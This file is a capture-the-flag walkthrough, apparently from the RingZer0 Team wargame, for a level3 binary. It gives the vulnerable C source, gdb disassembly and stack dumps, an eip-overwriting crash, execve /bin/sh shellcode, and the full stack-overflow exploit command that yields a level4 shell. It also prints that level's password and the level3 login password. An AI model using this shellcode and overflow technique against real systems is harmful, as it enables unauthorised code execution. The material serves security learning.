@@ -1,0 +1,185 @@
+R5040756:~ kef03$ ssh -p 22222 level3@ringzer0team.com
+level3@ringzer0team.com's password: b130hOOfGftXUfmRZlgD
+
+         _                             ____  __                     
+   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
+  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
+                            / _ \ ' \| | | ' \/ -_) | (__  | | | _| 
+                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
+                                                                    
+
+Last login: Wed Jan 11 23:36:58 2017 from 75.135.82.237
+level3@rzt-bin01:~$ ls
+level3@rzt-bin01:~$ cd /levels
+level3@rzt-bin01:/levels$ ls
+level1  level1.c  level2  level2.c  level3  level3.c  level4  level4.c
+level3@rzt-bin01:/levels$ cat level3.c
+// Created by Hidden (hidden@undernet.org)
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+char* concat(char *buf, char *s1, char *s2)
+{
+    // Copy s1 to buf
+    strcpy(buf, s1);
+    // Append s2 to s1 into buf
+    strcat(buf, s2);
+    return buf;
+}
+
+
+int main(int argc, char **argv)
+{
+    char buf[256];
+    char buf1[128];
+    char buf2[128];
+
+    if (argc != 3)
+        return 0;
+
+    // Copy argv[1] to buf1 and argv[2] to buf2
+    strncpy(buf1, argv[1], sizeof(buf1));
+    strncpy(buf2, argv[2], sizeof(buf2));
+
+    concat(buf, buf2, buf1);
+    printf("String result: %s\n", buf);
+    return 0;
+}
+
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080484eb <+0>: push   ebp
+   0x080484ec <+1>: mov    ebp,esp
+   0x080484ee <+3>: and    esp,0xfffffff0
+   0x080484f1 <+6>: sub    esp,0x210
+   0x080484f7 <+12>:  cmp    DWORD PTR [ebp+0x8],0x3
+   0x080484fb <+16>:  je     0x8048507 <main+28>
+   0x080484fd <+18>:  mov    eax,0x0
+   0x08048502 <+23>:  jmp    0x8048588 <main+157>
+   0x08048507 <+28>:  mov    eax,DWORD PTR [ebp+0xc]
+   0x0804850a <+31>:  add    eax,0x4
+   0x0804850d <+34>:  mov    eax,DWORD PTR [eax]
+   0x0804850f <+36>:  mov    DWORD PTR [esp+0x8],0x80
+   0x08048517 <+44>:  mov    DWORD PTR [esp+0x4],eax
+   0x0804851b <+48>:  lea    eax,[esp+0x90]
+   0x08048522 <+55>:  mov    DWORD PTR [esp],eax
+   0x08048525 <+58>:  call   0x80483c0 <strncpy@plt>
+   0x0804852a <+63>:  mov    eax,DWORD PTR [ebp+0xc]
+   0x0804852d <+66>:  add    eax,0x8
+   0x08048530 <+69>:  mov    eax,DWORD PTR [eax]
+   0x08048532 <+71>:  mov    DWORD PTR [esp+0x8],0x80
+   0x0804853a <+79>:  mov    DWORD PTR [esp+0x4],eax
+   0x0804853e <+83>:  lea    eax,[esp+0x10]
+   0x08048542 <+87>:  mov    DWORD PTR [esp],eax
+   0x08048545 <+90>:  call   0x80483c0 <strncpy@plt>
+   0x0804854a <+95>:  lea    eax,[esp+0x90]
+   0x08048551 <+102>: mov    DWORD PTR [esp+0x8],eax
+   0x08048555 <+106>: lea    eax,[esp+0x10]
+   0x08048559 <+110>: mov    DWORD PTR [esp+0x4],eax
+   0x0804855d <+114>: lea    eax,[esp+0x110]
+   0x08048564 <+121>: mov    DWORD PTR [esp],eax
+   0x08048567 <+124>: call   0x80484bc <concat>
+   0x0804856c <+129>: lea    eax,[esp+0x110]
+   0x08048573 <+136>: mov    DWORD PTR [esp+0x4],eax
+   0x08048577 <+140>: mov    DWORD PTR [esp],0x8048620
+   0x0804857e <+147>: call   0x8048370 <printf@plt>
+   0x08048583 <+152>: mov    eax,0x0
+   0x08048588 <+157>: leave  
+   0x08048589 <+158>: ret    
+End of assembler dump.
+
+(gdb) b *main+124  (break before concat, examine registers)
+
+(gdb) p &buf
+$1 = (char (*)[256]) 0xbffff580
+(gdb) p &buf2
+$2 = (char (*)[128]) 0xbffff480
+(gdb) p &buf1
+$3 = (char (*)[128]) 0xbffff500
+
+(gdb) x/100x $esp
+0xbffff470: 0xbffff580  0xbffff480  0xbffff500  0xbffff4cc
+0xbffff480: 0x90909090  0x90909090  0x90909090  0x90909090   <---- location of buf2  (shell code goes here)
+0xbffff490: 0x90909090  0x90909090  0x90909090  0x90909090   
+0xbffff4a0: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff4b0: 0xc0319090  0x2f2f6850  0x2f686873  0x896e6962
+0xbffff4c0: 0xe28950e3  0xb0e18953  0x4180cd0b  0x41414141
+0xbffff4d0: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff4e0: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff4f0: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff500: 0x90909090  0x90909090  0x90909090  0xfff57890   <---- location of buf1
+0xbffff510: 0x909090bf  0x90909090  0x90909090  0x90909090
+0xbffff520: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff530: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff540: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff550: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff560: 0x90909090  0x90909090  0x90909090  0x90909090
+0xbffff570: 0x90909090  0x90909090  0x90909090  0x00909090
+0xbffff580: 0xb7e87890  0xb7fea532  0xb7fda000  0x000044ec   <---- location of buf
+0xbffff590: 0xb7ffeff4  0xbffff69c  0xb7e8be00  0xb7ffadd8
+0xbffff5a0: 0xbffff5c0  0x00000000  0x0000000e  0xb7e94810
+0xbffff5b0: 0xb7fe0b1c  0xf63d4e2e  0x00000000  0x00000003
+0xbffff5c0: 0x00000000  0x00000000  0x00000001  0x000008a1
+0xbffff5d0: 0xb7fe0b48  0xb7fe0858  0x080482a6  0xb7e95040
+0xbffff5e0: 0x08048230  0x00000001  0xb7ffeff4  0xbffff6e0
+0xbffff5f0: 0xb7fffac0  0xbffff6b4  0xb7feb632  0xbffff6a4
+
+
+
+It turns out that overflowing the second argument (while putting 127 chars in first argument) overwrites eip
+
+(gdb) r $(python -c "print 'A'*127 + ' ' + 'B'*128")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /levels/level3 $(python -c "print 'A'*127 + ' ' + 'B'*128")
+
+Breakpoint 1, 0x08048567 in main (argc=3, argv=0xbffff734) at level3.c:31
+31    concat(buf, buf2, buf1);
+(gdb) c
+Continuing.
+String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) i r
+eax            0x0  0
+ecx            0xbffff458 -1073744808
+edx            0xb7fd7340 -1208126656
+ebx            0xb7fd5ff4 -1208131596
+esp            0xbffff690 0xbffff690
+ebp            0x41414141 0x41414141
+esi            0x0  0
+edi            0x0  0
+eip            0x41414141 0x41414141      <-- eip has been overwritten
+eflags         0x10292  [ AF SF IF RF ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0  0
+gs             0x33 51
+
+used trial and error to determine location of return address (could have used more elegant ways with a pattern generator though)
+The 14th location was where my return address was located
+
+25 bytes of shellcode:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+(gdb) r $(python -c "print '\x90'*13 + '\x90\xf4\xff\xbf' +'\x90'*110") $(python -c "print '\x90' * 50 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*53")
+
+level3@rzt-bin01:/levels$ /levels/level3 $(python -c "print '\x90'*13 + '\x90\xf4\xff\xbf' +'\x90'*110") $(python -c "print '\x90' * 50 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*53")
+String result: ??????????????????????????????????????????????????1?Ph//shh/bin??P??S??
+                                                                                      ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
+$ whoami
+level4
+$ cat /home/level4/.pass
+VHDY2pdYVyXi08kupbos
